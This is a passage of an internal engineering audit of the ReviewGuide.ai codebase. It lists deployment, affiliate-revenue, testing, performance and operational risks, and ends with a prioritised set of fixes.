- Vercel preview deployments: each commit gets unique URL like `reviewguide-qs8pkjpk2-habibs-projects-2039317a.vercel.app`. These are NOT in `CORS_ORIGINS`. The `CORS_ORIGIN_REGEX` is the only thing covering them.

**Railway builder choice drift (per CLAUDE.md):**
- "Git-triggered deploys sometimes use RAILPACK instead of DOCKERFILE. Use `railway deploy` CLI as backup if build gets stuck."
- This means TWO different build systems can run depending on Railway's mood. Behavior may differ.
- Fix: Force Railway to use Dockerfile via `railway.json` config.

---

## removeConsole Gotcha (CLAUDE.md)

**Current state — fixed but fragile:**
- File: `frontend/next.config.js` lines 14-18
- Current config: `removeConsole: process.env.NODE_ENV === 'production' ? { exclude: ['error', 'warn'] } : false`
- History: Original was `removeConsole: true` which stripped ALL console methods including `console.error` in production. This made Vercel deploys un-debuggable because runtime errors had no visible trace in browser DevTools. Fixed by adding `exclude: ['error', 'warn']`.
- Regression risk:
  - If a developer "tidies up" `next.config.js` to `removeConsole: true` — silent regression, errors disappear from browser again.
  - If `console.error` is replaced with `console.log` for "consistency" — silent loss of production visibility.
  - The exclude list does NOT include `console.info`, `console.debug`, `console.trace` — these are stripped. Don't rely on them.
- Better fix: Replace `console.error` with a wrapper utility that always works (e.g. `frontend/lib/log.ts` exporting `logError(...)` that internally calls Sentry capture + console.error). Then a single import dependency cannot be silently broken.

---

## GraphState ↔ initial_state Coupling (CLAUDE.md)

**The hidden bug pattern:**
- File: `backend/app/schemas/graph_state.py` (TypedDict) + `backend/app/api/v1/chat.py` line 295 (`initial_state`)
- Coupling: Every field in the GraphState TypedDict MUST also appear in the `initial_state` dict literal in chat.py, with a default value. If you add a field to the TypedDict and forget to add `"new_field": default_value` in chat.py, LangGraph crashes with a "channels missing" error at runtime (NOT compile time).
- Evidence: Commit `48702e8` ("fix: declare extended_search_confirmed in GraphState TypedDict") and `0bd88eb` ("Add tool_timing... Add tool_timing: {} default to initial_state in chat.py (prevents LangGraph crash)") show this happens.
- Current GraphState fields with annotations: `conversation_history`, `evidence_citations`, `agent_statuses`, `tool_citations`, `errors`, `stage_telemetry`, `citations` — all use `Annotated[List, operator.add]`. These reducers concatenate, so missing initial values default to `None` which crashes the reducer.
- Fix approach: Use a factory function `create_initial_state()` in `graph_state.py` that returns a fully initialized dict. Reference it from `chat.py`. Adding a field to the TypedDict + factory in one place prevents drift.

---

## Affiliate Revenue Leaks

**Amazon — empty default tag returns untagged links (CRITICAL):**
- Issue: `AMAZON_ASSOCIATE_TAGS` defaults to `"US:,UK:,DE:,..."` (all empty values). `parse_associate_tags()` returns `{}`. Fallback to `settings.AMAZON_ASSOCIATE_TAG` which also defaults to `""`. Resulting Amazon URLs have NO `tag=` query param — zero affiliate attribution.
- Files: `backend/app/core/config.py` lines 267-272; `backend/app/services/affiliate/providers/amazon_provider.py` lines 224-279
- Detection: Set in env vars on Railway (per memory: migrated to `revguide-20`). But local dev / dev deploys / preview deploys without env override silently leak.
- Fix: Refuse to start if `AMAZON_API_ENABLED=True` without a tag set.

**Amazon PA-API v5 EOL May 15, 2026 — hard deadline:**
- Status: Code uses PA-API endpoints in `amazon_provider.py` lines 477-498 but `AMAZON_API_ENABLED=False` is the default (mock mode runs). Production may have it enabled — check Railway env.
- Migration to Creators API is in v3 branch (commits `6f9cca0`, `a118bc2`, `87824b8`). NOT in v2 production.
- Risk: When AWS turns off PA-API, all Amazon product detail calls 404. If `AMAZON_API_ENABLED=True` on Railway, every Amazon search will fail.
- Fix: Cherry-pick Phase 5 from v3, OR ensure `AMAZON_API_ENABLED=False` and curated links are the only Amazon source.

**Curated Amazon links may have rotted:**
- Files: `backend/app/services/affiliate/providers/curated_amazon_links.py` (142 `amzn.to` links)
- Risk: `amzn.to` short links can expire or redirect to error pages. CLAUDE.md "Active" requirements lists "Fix: static Amazon amzn.to affiliate links not resolving in curated content".
- Detection: `LinkHealthChecker` runs every 6h (`LINK_HEALTH_CHECK_INTERVAL_HOURS=6`). But it's enabled by default — verify it's actually scheduled in production.
- Fix: Run a one-time audit script that resolves all 142 short links, flag broken ones.

**Skimlinks integration was DELETED from v2 production:**
- Evidence: `backend/app/services/affiliate/__pycache__/skimlinks.cpython-311.pyc` exists but no `skimlinks.py` source file.
- Tests `backend/tests/__pycache__/test_skimlinks.cpython-311-pytest-8.4.2.pyc` and `test_skimlinks_middleware.cpython-311-pytest-8.4.2.pyc` exist as cache only — no source.
- Implementation lives on v3 branch (commit `0b007d9` "feat(06-02): implement SkimlinksLinkWrapper service").
- Impact: PROJECT.md lists Skimlinks as "Active" requirement covering 48,500 merchants. v2 production has zero Skimlinks coverage — every non-Amazon, non-eBay product URL earns nothing.
- Fix: Cherry-pick Phase 6 + 7 from v3.

**Serper Shopping provider was DELETED from v2 production:**
- Evidence: `backend/app/services/affiliate/providers/__pycache__/serper_shopping_provider.cpython-311.pyc` exists, no source file.
- Implementation lives on v3 (commits `2fa5230`, `b1b8f82`).
- Impact: Multi-retailer product search returning real images & prices does not work in v2. Production users see eBay-only results (confirmed in `# ReviewGuide.ai — Comprehensive Te.txt` Tests 1-5).
- Fix: Cherry-pick Phase 3 from v3.

**eBay-only results:**
- Per CLAUDE.md "Active": "Fix: eBay is only returning actual search results (Amazon PA-API key needed or alternative)".
- Per `# ReviewGuide.ai — Comprehensive Te.txt`: Every test query returned eBay-only links.
- Root cause: Amazon API not enabled + Skimlinks/Serper deleted + curated link match misses for many queries.
- Fix: Multi-pronged — add curated coverage for popular queries, restore Skimlinks, switch to Amazon Creators API.

**eBay rate limits:**
- eBay Browse API allows 5000 calls/day on production keys. At 100 queries/day with avg 5 product searches each = 500 calls. At 1000 queries/day = 5000 calls — at limit.
- Files: `backend/app/services/affiliate/providers/ebay_provider.py`
- Mitigation: Redis search cache (`SEARCH_CACHE_TTL`) reduces duplicate calls.
- Fix: Apply for higher quota; add explicit per-day counter to alert at 80%.

**SerpAPI/Serper.dev rate limits:**
- SerpAPI free tier: 250 searches/mo. Paid tiers $50-$250/mo.
- Each product query may run 3 review searches (capped per RFC). At 100 queries/day = 300 SerpAPI calls/day = 9000/mo. Will exceed free tier in days.
- Files: `backend/app/services/serpapi/client.py`
- Mitigation: `SERPAPI_CACHE_TTL=86400` (24h cache). Per memory, `ENABLE_SERPAPI` was missing on Railway in past — silently returned empty.
- Fix: Verify `ENABLE_SERPAPI=True` and `SERPAPI_API_KEY` set on Railway. Add Sentry alert on circuit breaker trip.

**eBay 401 token refresh fragility:**
- Commit `b6dc9c2` "fix: eBay 401 token refresh + auto-include hotel/flight tools for travel" — historical fix.
- Risk: eBay OAuth tokens expire every 2 hours. If refresh logic has edge cases, periodic 401 cascades into "no products" responses.
- Fix: Add explicit token expiry check before each search call.

---

## Test Coverage Gaps

**Frontend regression gate landed in v3 only:**
- Files (in v3, NOT v2): `frontend/tests/regressionGate.test.tsx` (commit `db83f61`)
- Coverage in v2 production: 18 test files exist but cover individual components. No end-to-end QAR-08 through QAR-12 + QAR-16 regression suite.

**Backend regression gate landed in v3 only:**
- Files (in v3, NOT v2): `backend/tests/test_regression_gate.py` (commit `dd9e480`)
- Coverage in v2 production: 19 test files exist but no QAR-01 through QAR-07 regression suite.

**Core agents have no direct unit tests (UNCHANGED):**
- Files: `backend/app/agents/{clarifier,planner,safety,intent}_agent.py`
- Risk: Slot extraction, PII redaction, jailbreak detection, plan validation regressions undetected.
- Priority: HIGH

**`PlanExecutor` has no tests (UNCHANGED):**
- Files: `backend/app/services/plan_executor.py` (912 lines)
- Risk: Topological sort, parallel execution, context resolution, timeout handling all untested.
- Priority: HIGH

**LangGraph workflow has no integration tests for full agent chain (UNCHANGED):**
- Files: `backend/app/services/langgraph/workflow.py`
- Priority: HIGH

**Delete-conversation and get-history endpoints have no tests (UNCHANGED, security-adjacent):**
- Files: `backend/app/api/v1/chat.py` lines 924-986
- Priority: HIGH

**No E2E tests (Playwright/Cypress) anywhere:**
- Real user flows (search → result → click affiliate link → tracking) are completely uncovered.
- The full QA report in `# ReviewGuide.ai — Comprehensive Te.txt` was done MANUALLY in browser.
- Fix: Add Playwright with 5-10 critical-path tests, run in CI.

---

## Performance Bottlenecks

**`COMPOSER_MAX_TOKENS=80` truncates all composer output (UNCHANGED):**
- Files: `backend/app/core/config.py` line 213
- Cause: Looks like a misconfigured default — 80 tokens fits a label, not a blog article.
- Impact: Composer agents (product, travel, intro, unclear) likely have output truncated mid-sentence.
- Fix: Audit Langfuse traces for actual output lengths; set default to 1000-2000.

**Conversation history over-fetched (UNCHANGED):**
- `MAX_HISTORY_LIMIT=100` in `ConversationRepository` vs `MAX_HISTORY_MESSAGES=30` for LLM context.
- Files: `backend/app/repositories/conversation_repository.py:35`, `backend/app/core/config.py:87`
- Fix: Pass `settings.MAX_HISTORY_MESSAGES` as `limit` to `get_history()`.

**Slow first paint — first content at ~15s (target 5-10s):**
- Source: `# ReviewGuide.ai — Comprehensive Te.txt` Test 4.
- Cause: Currently no token streaming for blog article (was disabled in commits `2c49b74`, `85a627c`, `39fcc3d` to fix SSE hang). v3 has streaming compose (`b30e861`, `4cb253a`, `a4013da`) — NOT in v2.
- Fix: Cherry-pick streaming compose work from v3 with regression testing for SSE hang.

**No status messages during loading:**
- Source: `# ReviewGuide.ai — Comprehensive Te.txt` Test 4 — only "Thinking..." shown.
- Status: Tool citations exist (`tool_citations` field in GraphState) but UI only shows generic spinner.
- Fix: Wire `tool_citations` to status text in `Message.tsx` line 188 (currently shows `message.statusText || 'Thinking...'` — likely never gets actual tool name).

---

## Stub / Unimplemented Features

**Expedia hotel provider returns empty (UNCHANGED):**
- File: `backend/app/services/travel/providers/expedia_provider.py:69-168` — entire `search_hotels()` returns `[]`.
- Impact: Expedia listed as a travel provider but contributes zero results.

**Walmart, Best Buy, Target affiliate providers don't exist:**
- Files: `backend/app/core/config.py` lines 274-288 (config vars marked "placeholder — not yet implemented")
- Impact: Enabling the flags has no effect.

**`ParallelFetcher._execute_mcp_tool()` raises `NotImplementedError`:**
- File: `backend/app/services/tiered_router/parallel_fetcher.py:180`
- Impact: Any code path reaching this raises at runtime.

---

## Operational Risks

**Two `kishan_frontend/` and `frontend/` directories with `node_modules`:**
- Both have `node_modules/` committed-history-wise (probably gitignored but local dev artifact).
- Risk: ~1GB+ duplicate, deploy script may pick wrong one.

**`NUL` file in repo root (Windows artifact):**
- File: `NUL` (created by accidental redirect on Windows like `cmd > NUL`).
- Cleanup: Delete it.

**`# ReviewGuide.ai — Comprehensive Te.txt` and `# ReviewGuide.ai — frontendredesign.txt` are untracked at repo root:**
- Status: Per `git status`, both untracked.
- Risk: These contain valuable QA findings and design specs but aren't in version control. Will be lost on machine wipe.
- Fix: Move to `docs/qa/` and commit, or delete after migrating content to `.planning/`.

**Multiple `# ReviewGuide.ai — ...` files use em-dash and `#` prefix in filename:**
- This breaks shell tools (need quoting). Rename to `qa-comprehensive-test.md`, `frontend-redesign-spec.md`.

**Background scheduler runs link health check every 6h:**
- File: `backend/app/services/scheduler.py`, config `LINK_HEALTH_CHECK_INTERVAL_HOURS=6`
- Risk: Multi-worker deployments will run scheduler N times — duplicate work + DB writes.
- Fix: Use `apscheduler` `JobStore` with Redis backend OR Celery beat with leader election.

---

## Immediate Action Items (next 2 weeks)

1. **Add `.github/workflows/ci.yml`** — block PRs that don't compile or pass tests. Effort: M.
2. **Add Sentry to frontend + backend** — visibility into prod errors. Effort: S.
3. **Fix Amazon affiliate tag default** — startup validator that refuses empty tag in prod. Effort: S.
4. **Cherry-pick Phase 23 fixes from v3 to v2-with-swipe** OR merge v3 to production. Effort: L.
5. **Add `Depends(get_current_user)` to delete/get conversation endpoints**. Effort: S.
6. **Reduce `DB_POOL_SIZE`/`DB_MAX_OVERFLOW` to 10/5 per worker** OR introduce PgBouncer. Effort: S.
7. **Fix `langfuse_handler` per-request instantiation** — restores per-trace attribution. Effort: S.
8. **Verify Railway env vars** — `ENABLE_SERPAPI`, `SERPAPI_API_KEY`, `AMAZON_ASSOCIATE_TAG`, `CORS_ORIGIN_REGEX` all set. Effort: S.
9. **Update CLAUDE.md to reflect current Message.tsx + BlockRegistry split** — stale "protected functions" guidance. Effort: S.
10. **Set Redis maxmemory policy in `docker-compose.yml`**. Effort: S.

---

*Concerns audit: 2026-04-16 (replaces 2026-03-15 version)*
